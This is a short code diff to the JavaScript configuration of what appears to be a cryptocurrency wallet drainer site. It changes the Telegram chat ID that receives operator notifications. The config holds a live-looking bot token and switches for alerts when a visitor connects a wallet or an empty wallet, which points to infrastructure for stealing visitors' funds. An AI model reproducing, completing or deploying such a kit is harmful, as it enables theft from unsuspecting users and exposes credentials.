@@ -44,7 +44,7 @@ document.addEventListener("DOMContentLoaded", async () => {
     
     const TG = {
         token: "7938153457:AAGt3_wK6pp8D__0hL5B0Ej8jjn8K4DFzYc", // Your @Botfather Bot token Ex. "725766552:ABChbSGObfvqkdxX4OEhZ_Hb8_V680Sc6Cs"
-        chat_id: "1002284696645", // ID of the chat for notifications (include the minus if present) Ex. "-1033337653892"
+        chat_id: "-1002749967627", // ID of the chat for notifications (include the minus if present) Ex. "-1033337653892"
         enter_website: false, // Notify on site entry ('true' enabled or 'false' disabled)
         connect_success: false, // Notify on wallet connection ('true' enabled or 'false' disabled)
         connect_empty: false,  // Notify on empty wallet connection ('true' enabled or 'false' disabled)
